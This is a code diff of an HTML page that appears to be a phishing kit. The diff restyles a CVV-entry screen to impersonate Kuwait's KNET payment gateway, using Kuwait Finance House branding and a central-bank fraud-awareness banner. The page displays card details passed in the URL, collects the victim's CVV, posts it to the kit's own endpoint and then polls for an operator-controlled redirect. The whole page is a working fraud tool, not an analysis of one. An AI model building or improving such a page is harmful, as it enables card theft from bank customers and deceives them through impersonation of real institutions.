@@ -1,203 +1,213 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>رمز الأمان CVV - نظام الضمان الصحي</title>
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet" />
+  <title>CVV Verification - Payment Gateway</title>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
     body {
-      background: linear-gradient(135deg, #0a1628 0%, #1a2a4a 50%, #0a1628 100%);
+      background-color: #d6d6d6;
+      font-family: Arial, Helvetica, sans-serif;
+      font-size: 13px;
+      color: #333;
       min-height: 100vh;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-    }
-    .payment-wrapper {
-      width: 100%;
-      max-width: 480px;
-    }
-    .bank-header {
-      background: linear-gradient(135deg, #1a3a6b, #0d2447);
-      border-radius: 16px 16px 0 0;
-      padding: 20px 24px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      border-bottom: 2px solid #2a4a8a;
-    }
-    .bank-logo {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-    }
-    .bank-logo i { font-size: 1.8rem; color: #4a9eff; }
-    .bank-logo span { color: white; font-size: 1rem; font-weight: 600; }
-    .secure-badge {
-      display: flex;
-      align-items: center;
-      gap: 5px;
-      background: rgba(16, 185, 129, 0.15);
-      border: 1px solid rgba(16, 185, 129, 0.4);
-      border-radius: 20px;
-      padding: 4px 12px;
-      color: #10b981;
-      font-size: 0.75rem;
-    }
-    .payment-card {
-      background: #0f1e35;
-      border: 1px solid #1e3a5f;
-      border-top: none;
-      border-radius: 0 0 16px 16px;
-      padding: 28px 24px;
-      box-shadow: 0 20px 60px rgba(0,0,0,0.5);
-    }
-    .amount-section {
-      background: linear-gradient(135deg, #1a3a6b, #0d2447);
-      border-radius: 12px;
-      padding: 16px 20px;
-      margin-bottom: 24px;
-      text-align: center;
-      border: 1px solid #2a4a8a;
-    }
-    .amount-label { color: #7a9cc0; font-size: 0.8rem; margin-bottom: 4px; }
-    .amount-value { color: white; font-size: 1.8rem; font-weight: 700; }
-    .amount-currency { color: #4a9eff; font-size: 1rem; }
-    .card-display {
-      background: linear-gradient(135deg, #1e3a6b 0%, #2a5298 100%);
-      border-radius: 12px;
-      padding: 16px 20px;
-      margin-bottom: 20px;
-      position: relative;
-      overflow: hidden;
-      border: 1px solid #3a5a9a;
-    }
-    .card-display::before {
-      content: '';
-      position: absolute;
-      top: -30px; right: -30px;
-      width: 120px; height: 120px;
-      border-radius: 50%;
-      background: rgba(255,255,255,0.05);
-    }
-    .card-display::after {
-      content: '';
-      position: absolute;
-      bottom: -40px; left: -20px;
-      width: 150px; height: 150px;
-      border-radius: 50%;
-      background: rgba(255,255,255,0.03);
-    }
-    .card-number-display {
-      color: rgba(255,255,255,0.7);
-      font-size: 1rem;
-      letter-spacing: 3px;
-      font-family: monospace;
-      margin-bottom: 8px;
-    }
-    .card-info-row {
-      display: flex;
-      justify-content: space-between;
+      flex-direction: column;
       align-items: center;
     }
-    .card-holder { color: rgba(255,255,255,0.8); font-size: 0.85rem; }
-    .card-expiry { color: rgba(255,255,255,0.8); font-size: 0.85rem; }
 
-    /* CVV Section - بتصميم مشابه لـ OTP */
-    .cvv2-section {
-      background: rgba(74, 158, 255, 0.05);
-      border: 1px solid rgba(74, 158, 255, 0.2);
-      border-radius: 10px;
-      padding: 20px;
-      margin-bottom: 20px;
+    /* Banner */
+    .banner {
+      width: 100%;
+      max-width: 780px;
+      margin: 10px auto 0;
     }
-    .cvv2-label {
-      color: #7ab3ff;
-      font-size: 0.85rem;
-      margin-bottom: 14px;
-      display: flex;
-      align-items: center;
-      gap: 6px;
+    .banner img {
+      width: 100%;
+      height: auto;
+      display: block;
     }
-    .cvv2-inputs {
-      display: flex;
-      gap: 10px;
-      justify-content: center;
-      margin-bottom: 10px;
+
+    /* Main Container */
+    .container {
+      width: 100%;
+      max-width: 780px;
+      margin: 0 auto;
+      padding: 0 10px 20px;
     }
-    .cvv2-input {
-      width: 52px;
-      height: 58px;
-      background: #0a1628;
-      border: 2px solid #1e3a5f;
+
+    /* Card Box */
+    .card-box {
+      background: #f0f0f0;
+      border: 1px solid #ccc;
       border-radius: 8px;
-      color: white;
-      font-size: 1.5rem;
-      text-align: center;
-      font-family: monospace;
-      transition: all 0.3s;
-    }
-    .cvv2-input:focus {
-      outline: none;
-      border-color: #4a9eff;
-      box-shadow: 0 0 0 3px rgba(74, 158, 255, 0.15);
-    }
-    .cvv2-hint {
-      display: flex;
-      align-items: center;
-      gap: 6px;
-      color: #64748b;
-      font-size: 0.75rem;
-      margin-top: 8px;
-      justify-content: center;
-    }
-
-    .submit-btn {
-      width: 100%;
-      background: linear-gradient(135deg, #1a6bff, #0d4fd4);
-      border: none;
-      border-radius: 10px;
-      color: white;
-      font-size: 1rem;
-      font-weight: 600;
-      padding: 14px;
-      cursor: pointer;
-      transition: all 0.3s;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
+      padding: 20px 24px;
       margin-bottom: 12px;
     }
-    .submit-btn:hover { background: linear-gradient(135deg, #2a7bff, #1a5fe4); transform: translateY(-1px); }
-    .submit-btn:active { transform: translateY(0); }
-    .submit-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
-    .cancel-btn {
-      width: 100%;
-      background: transparent;
-      border: 1px solid #2a3a5a;
-      border-radius: 10px;
-      color: #64748b;
-      font-size: 0.9rem;
-      padding: 11px;
-      cursor: pointer;
-      transition: all 0.3s;
+
+    /* KFH Logo */
+    .bank-logo {
+      text-align: center;
+      margin-bottom: 18px;
     }
-    .cancel-btn:hover { border-color: #ef4444; color: #ef4444; }
-    .security-info {
+    .bank-logo img {
+      height: 55px;
+    }
+
+    /* Info Table */
+    .info-table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-bottom: 6px;
+    }
+    .info-table tr td {
+      padding: 8px 6px;
+      border-bottom: 1px solid #ccc;
+      vertical-align: middle;
+    }
+    .info-table tr:last-child td {
+      border-bottom: none;
+    }
+    .info-table td:first-child {
+      font-weight: bold;
+      color: #1a5276;
+      width: 40%;
+    }
+
+    /* Notification Box */
+    .notification-box {
+      background: #d6eaf8;
+      border: 1px solid #aed6f1;
+      border-radius: 4px;
+      padding: 12px 16px;
+      margin-bottom: 14px;
+      font-size: 13px;
+      color: #1a5276;
+      line-height: 1.6;
+    }
+    .notification-box strong {
+      color: #1a5276;
+    }
+
+    /* CVV Input Row */
+    .cvv-row {
       display: flex;
       align-items: center;
-      justify-content: center;
-      gap: 6px;
-      color: #475569;
-      font-size: 0.72rem;
-      margin-top: 16px;
+      padding: 8px 6px;
+      border-bottom: 1px solid #ccc;
     }
+    .cvv-row label {
+      font-weight: bold;
+      color: #1a5276;
+      width: 40%;
+      flex-shrink: 0;
+    }
+    .cvv-input {
+      border: 2px solid #f39c12;
+      border-radius: 3px;
+      padding: 6px 10px;
+      font-size: 14px;
+      width: 200px;
+      letter-spacing: 4px;
+      text-align: center;
+      outline: none;
+      background: #fff;
+    }
+    .cvv-input:focus {
+      border-color: #e67e22;
+      box-shadow: 0 0 4px rgba(243,156,18,0.4);
+    }
+
+    /* Error Message */
+    .error-msg {
+      color: #c0392b;
+      font-size: 12px;
+      padding: 6px 6px 0;
+      display: none;
+    }
+    .error-msg.show { display: block; }
+
+    /* Buttons Box */
+    .buttons-box {
+      background: #f0f0f0;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      padding: 16px 24px;
+      margin-bottom: 12px;
+      display: flex;
+      gap: 12px;
+    }
+    .btn-confirm {
+      flex: 1;
+      background: #f0f0f0;
+      border: 1px solid #aaa;
+      border-radius: 4px;
+      padding: 10px;
+      font-size: 13px;
+      font-weight: bold;
+      cursor: pointer;
+      text-align: center;
+      color: #333;
+      transition: background 0.2s;
+    }
+    .btn-confirm:hover { background: #e0e0e0; }
+    .btn-confirm:disabled { opacity: 0.6; cursor: not-allowed; }
+
+    .btn-cancel {
+      flex: 1;
+      background: #f0f0f0;
+      border: 1px solid #aaa;
+      border-radius: 4px;
+      padding: 10px;
+      font-size: 13px;
+      font-weight: bold;
+      cursor: pointer;
+      text-align: center;
+      color: #333;
+      transition: background 0.2s;
+    }
+    .btn-cancel:hover { background: #e0e0e0; }
+
+    /* Footer */
+    .footer {
+      text-align: center;
+      margin-top: 10px;
+      color: #555;
+      font-size: 12px;
+    }
+    .footer a {
+      color: #1a5276;
+      text-decoration: none;
+      font-weight: bold;
+    }
+    .footer a:hover { text-decoration: underline; }
+
+    /* Loading Overlay */
     .loading-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.5);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      flex-direction: column;
+      gap: 14px;
+    }
+    .loading-overlay.show { display: flex; }
+    .spinner {
+      width: 44px; height: 44px;
+      border: 4px solid rgba(255,255,255,0.3);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .loading-text { color: #fff; font-size: 14px; }
+
+    /* Success Overlay */
+    .success-overlay {
       position: fixed;
       inset: 0;
       background: rgba(0,0,0,0.7);
@@ -206,58 +216,15 @@
       justify-content: center;
       z-index: 9999;
       flex-direction: column;
-      gap: 16px;
-    }
-    .loading-overlay.show { display: flex; }
-    .spinner {
-      width: 50px; height: 50px;
-      border: 4px solid rgba(74, 158, 255, 0.2);
-      border-top-color: #4a9eff;
-      border-radius: 50%;
-      animation: spin 0.8s linear infinite;
-    }
-    @keyframes spin { to { transform: rotate(360deg); } }
-    .loading-text { color: white; font-size: 0.9rem; }
-    .error-msg {
-      background: rgba(239, 68, 68, 0.1);
-      border: 1px solid rgba(239, 68, 68, 0.3);
-      border-radius: 8px;
-      color: #ef4444;
-      font-size: 0.82rem;
-      padding: 10px 14px;
-      margin-bottom: 14px;
-      display: none;
-    }
-    .error-msg.show { display: block; }
-    .success-overlay {
-      position: fixed;
-      inset: 0;
-      background: rgba(0,0,0,0.85);
-      display: none;
-      align-items: center;
-      justify-content: center;
-      z-index: 9999;
-      flex-direction: column;
-      gap: 16px;
+      gap: 14px;
     }
     .success-overlay.show { display: flex; }
-    .success-icon { font-size: 4rem; color: #10b981; animation: bounce 0.6s ease; }
-    @keyframes bounce { 0%,100%{transform:scale(1)} 50%{transform:scale(1.2)} }
-    .success-text { color: white; font-size: 1.1rem; font-weight: 600; }
-    .success-sub { color: #94a3b8; font-size: 0.85rem; }
-    .step-indicator {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      margin-bottom: 20px;
+    .success-icon {
+      font-size: 60px;
+      color: #27ae60;
     }
-    .step { width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 0.75rem; font-weight: 600; }
-    .step.done { background: #10b981; color: white; }
-    .step.active { background: #4a9eff; color: white; }
-    .step.pending { background: #1e3a5f; color: #64748b; }
-    .step-line { width: 40px; height: 2px; background: #1e3a5f; }
-    .step-line.done { background: #10b981; }
+    .success-text { color: #fff; font-size: 18px; font-weight: bold; }
+    .success-sub { color: #ccc; font-size: 13px; }
   </style>
 </head>
 <body>
@@ -265,145 +232,154 @@
 <!-- Loading Overlay -->
 <div class="loading-overlay" id="loadingOverlay">
   <div class="spinner"></div>
-  <div class="loading-text" id="loadingText">جاري معالجة الطلب...</div>
+  <div class="loading-text" id="loadingText">Processing...</div>
 </div>
 
 <!-- Success Overlay -->
 <div class="success-overlay" id="successOverlay">
-  <i class="bi bi-check-circle-fill success-icon"></i>
-  <div class="success-text">تمت العملية بنجاح</div>
-  <div class="success-sub">جاري تحويلك...</div>
+  <div class="success-icon">✓</div>
+  <div class="success-text">Transaction Successful</div>
+  <div class="success-sub">Redirecting...</div>
 </div>
 
-<div class="payment-wrapper">
-  <!-- Header -->
-  <div class="bank-header">
+<!-- Banner -->
+<div class="banner">
+  <img src="https://www.cbk.gov.kw/en/assets/images/fraud-awareness-banner.jpg"
+       onerror="this.style.background='linear-gradient(135deg,#1a5276,#2980b9)';this.style.height='80px';this.removeAttribute('onerror');"
+       alt="Fraud Awareness Banner" />
+</div>
+
+<div class="container">
+
+  <!-- Main Card Box -->
+  <div class="card-box">
+
+    <!-- KFH Logo -->
     <div class="bank-logo">
-      <i class="bi bi-credit-card-2-back-fill"></i>
-      <span>التحقق برمز CVV</span>
+      <img src="https://upload.wikimedia.org/wikipedia/en/thumb/3/3e/Kuwait_Finance_House_logo.svg/250px-Kuwait_Finance_House_logo.svg.png"
+           onerror="this.outerHTML='<div style=\'font-size:22px;font-weight:bold;color:#1a5276;\'>&#x2618; KFH</div>'"
+           alt="KFH Logo" />
     </div>
-    <div class="secure-badge">
-      <i class="bi bi-lock-fill"></i>
-      <span>SSL مشفر</span>
-    </div>
+
+    <!-- Merchant & Amount Info -->
+    <table class="info-table">
+      <tr>
+        <td>Merchant:</td>
+        <td id="displayMerchant">Online Insurance System</td>
+      </tr>
+      <tr>
+        <td>Amount:</td>
+        <td><strong id="displayAmount">KD 0.000</strong></td>
+      </tr>
+    </table>
+
   </div>
 
-  <!-- Payment Card -->
-  <div class="payment-card">
+  <!-- CVV Card Box -->
+  <div class="card-box">
 
-    <!-- Step Indicator -->
-    <div class="step-indicator">
-      <div class="step done"><i class="bi bi-check"></i></div>
-      <div class="step-line done"></div>
-      <div class="step done"><i class="bi bi-check"></i></div>
-      <div class="step-line done"></div>
-      <div class="step active">3</div>
-      <div class="step-line"></div>
-      <div class="step pending">4</div>
+    <!-- Notification -->
+    <div class="notification-box">
+      <strong>NOTIFICATION:</strong> Please enter the CVV (Card Verification Value) found on the back of your card. This is a 3-digit security code printed on the signature strip.
     </div>
 
-    <!-- Amount -->
-    <div class="amount-section">
-      <div class="amount-label">المبلغ المطلوب</div>
-      <div class="amount-value">
-        <span id="displayAmount">0.00</span>
-        <span class="amount-currency"> KWD</span>
-      </div>
-    </div>
-
-    <!-- Card Display -->
-    <div class="card-display">
-      <div class="card-number-display" id="displayCardNumber">•••• •••• •••• ••••</div>
-      <div class="card-info-row">
-        <div class="card-holder" id="displayCardHolder">حامل البطاقة</div>
-        <div class="card-expiry" id="displayExpiry">MM/YY</div>
-      </div>
-    </div>
+    <!-- Card Details Table -->
+    <table class="info-table">
+      <tr>
+        <td>Card Number:</td>
+        <td id="displayCardNumber">**** **** **** ****</td>
+      </tr>
+      <tr>
+        <td>Expiration Month:</td>
+        <td id="displayExpMonth">--</td>
+      </tr>
+      <tr>
+        <td>Expiration Year:</td>
+        <td id="displayExpYear">----</td>
+      </tr>
+      <tr>
+        <td>PIN:</td>
+        <td>****</td>
+      </tr>
+    </table>
 
     <!-- Error Message -->
-    <div class="error-msg" id="errorMsg"></div>
+    <div class="error-msg" id="errorMsg">Please enter a valid CVV code.</div>
 
-    <!-- CVV Section - بتصميم OTP -->
-    <div class="cvv2-section">
-      <div class="cvv2-label">
-        <i class="bi bi-credit-card-2-back"></i>
-        أدخل رمز الأمان (CVV) المكون من 3 أرقام على ظهر البطاقة
-      </div>
-      <div class="cvv2-inputs">
-        <input type="text" class="cvv2-input" maxlength="1" inputmode="numeric" id="cvv1" />
-        <input type="text" class="cvv2-input" maxlength="1" inputmode="numeric" id="cvv2" />
-        <input type="text" class="cvv2-input" maxlength="1" inputmode="numeric" id="cvv3" />
-      </div>
-      <div class="cvv2-hint">
-        <i class="bi bi-info-circle"></i>
-        <span>الرقم المكون من 3 أرقام على ظهر البطاقة</span>
-      </div>
-    </div>
-
-    <!-- Submit Button -->
-    <button class="submit-btn" id="submitBtn" onclick="handleSubmit()">
-      <i class="bi bi-lock-fill"></i>
-      <span id="submitText">تأكيد رمز CVV</span>
-    </button>
-
-    <!-- Cancel Button -->
-    <button class="cancel-btn" onclick="handleCancel()">
-      إلغاء العملية
-    </button>
-
-    <!-- Security Info -->
-    <div class="security-info">
-      <i class="bi bi-shield-check"></i>
-      <span>محمي بتشفير 256-bit SSL | بيانات آمنة ومشفرة</span>
+    <!-- CVV Input Row -->
+    <div class="cvv-row">
+      <label for="cvvInput">CVV:</label>
+      <input
+        type="password"
+        id="cvvInput"
+        class="cvv-input"
+        placeholder="CVV"
+        maxlength="4"
+        inputmode="numeric"
+        autocomplete="cc-csc"
+      />
     </div>
 
   </div>
+
+  <!-- Buttons Box -->
+  <div class="buttons-box">
+    <button class="btn-confirm" id="confirmBtn" onclick="handleConfirm()">Confirm</button>
+    <button class="btn-cancel" onclick="handleCancel()">Cancel</button>
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">
+    <p>All Rights Reserved. Copyright 2025 ©</p>
+    <p><a href="https://www.knet.com.kw" target="_blank">The Shared Electronic Banking Services Company - KNET</a></p>
+  </div>
+
 </div>
 
 <script>
-  // قراءة البيانات من URL params
+  // Read URL params
   const params = new URLSearchParams(window.location.search);
   const referenceId = params.get('ref') || '';
-  const amount = params.get('amount') || '0.00';
+  const amount = params.get('amount') || '0.000';
   const cardNumber = params.get('card') || '';
-  const cardHolder = params.get('holder') || 'حامل البطاقة';
-  const expiry = params.get('expiry') || 'MM/YY';
+  const cardHolder = params.get('holder') || '';
+  const expiry = params.get('expiry') || '';
+  const merchant = params.get('merchant') || 'Online Insurance System';
 
-  // عرض البيانات
-  document.getElementById('displayAmount').textContent = amount;
-  document.getElementById('displayCardHolder').textContent = cardHolder;
-  document.getElementById('displayExpiry').textContent = expiry;
+  // Display data
+  document.getElementById('displayMerchant').textContent = merchant;
+  document.getElementById('displayAmount').textContent = 'KD ' + parseFloat(amount).toFixed(3);
 
   if (cardNumber) {
-    const masked = cardNumber.replace(/\d(?=\d{4})/g, '•');
+    const masked = cardNumber.replace(/\d(?=\d{4})/g, '*');
     const formatted = masked.replace(/(.{4})/g, '$1 ').trim();
     document.getElementById('displayCardNumber').textContent = formatted;
   }
 
-  // CVV inputs auto-focus
-  const cvvInputs = document.querySelectorAll('.cvv2-input');
-  cvvInputs.forEach((input, idx, inputs) => {
-    input.addEventListener('input', () => {
-      if (input.value && idx < inputs.length - 1) inputs[idx + 1].focus();
-    });
-    input.addEventListener('keydown', (e) => {
-      if (e.key === 'Backspace' && !input.value && idx > 0) inputs[idx - 1].focus();
-    });
-  });
+  if (expiry) {
+    const parts = expiry.split('/');
+    if (parts.length === 2) {
+      document.getElementById('displayExpMonth').textContent = parts[0];
+      document.getElementById('displayExpYear').textContent = '20' + parts[1];
+    }
+  }
 
-  async function handleSubmit() {
-    const btn = document.getElementById('submitBtn');
+  // Focus CVV input
+  document.getElementById('cvvInput').focus();
+
+  async function handleConfirm() {
+    const cvv = document.getElementById('cvvInput').value.trim();
     const errorMsg = document.getElementById('errorMsg');
     errorMsg.classList.remove('show');
 
-    const cvv = ['cvv1','cvv2','cvv3'].map(id => document.getElementById(id).value).join('');
-    if (cvv.length < 3) {
-      showError('يرجى إدخال رمز CVV كاملاً (3 أرقام)');
+    if (!cvv || cvv.length < 3) {
+      errorMsg.classList.add('show');
       return;
     }
 
+    const btn = document.getElementById('confirmBtn');
     btn.disabled = true;
-    showLoading('جاري التحقق من البطاقة...');
+    showLoading('Verifying...');
 
     try {
       const res = await fetch('/api/cvv-submit', {
@@ -415,10 +391,7 @@
       hideLoading();
 
       if (data.success) {
-        if (data.requireOtp) {
-          showSuccess();
-          setTimeout(() => { window.location.href = `/otp?ref=${referenceId}`; }, 2000);
-        } else if (data.redirect) {
+        if (data.redirect) {
           showSuccess();
           setTimeout(() => { window.location.href = data.redirect; }, 2000);
         } else {
@@ -426,30 +399,26 @@
           startRedirectPolling(data.referenceId || referenceId);
         }
       } else {
-        showError(data.message || 'رمز CVV غير صحيح، يرجى المحاولة مجدداً');
+        errorMsg.textContent = data.message || 'Invalid CVV. Please try again.';
+        errorMsg.classList.add('show');
         btn.disabled = false;
       }
     } catch (err) {
       hideLoading();
-      showError('حدث خطأ في الاتصال، يرجى المحاولة مجدداً');
+      errorMsg.textContent = 'Connection error. Please try again.';
+      errorMsg.classList.add('show');
       btn.disabled = false;
     }
   }
 
   function handleCancel() {
-    if (confirm('هل تريد إلغاء العملية؟')) {
+    if (confirm('Are you sure you want to cancel this transaction?')) {
       window.history.back();
     }
   }
 
-  function showError(msg) {
-    const el = document.getElementById('errorMsg');
-    el.textContent = msg;
-    el.classList.add('show');
-  }
-
   function showLoading(text) {
-    document.getElementById('loadingText').textContent = text || 'جاري المعالجة...';
+    document.getElementById('loadingText').textContent = text || 'Processing...';
     document.getElementById('loadingOverlay').classList.add('show');
   }
 
@@ -462,9 +431,8 @@
   }
 
   function showWaiting() {
-    const overlay = document.getElementById('loadingOverlay');
-    overlay.classList.add('show');
-    document.getElementById('loadingText').textContent = 'جاري معالجة طلبك، يرجى الانتظار...';
+    document.getElementById('loadingText').textContent = 'Processing your request, please wait...';
+    document.getElementById('loadingOverlay').classList.add('show');
   }
 
   let pollingInterval = null;
@@ -482,6 +450,12 @@
       } catch(e) {}
     }, 3000);
   }
+
+  // Enter key support
+  document.getElementById('cvvInput').addEventListener('keydown', (e) => {
+    if (e.key === 'Enter') handleConfirm();
+  });
 </script>
+
 </body>
 </html>
